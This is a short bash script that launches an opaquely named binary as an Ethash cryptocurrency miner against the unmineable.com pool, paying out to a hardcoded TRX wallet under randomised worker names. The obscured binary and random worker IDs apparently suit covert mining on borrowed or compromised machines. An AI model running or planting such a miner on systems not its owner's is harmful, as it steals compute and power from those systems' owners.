#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TUu8AkP9q4oVLGSfTVvuuxdVYRXstxr1Be
WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-ivan#bdfc-cm6i)
chmod +x abcd
./abcd --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
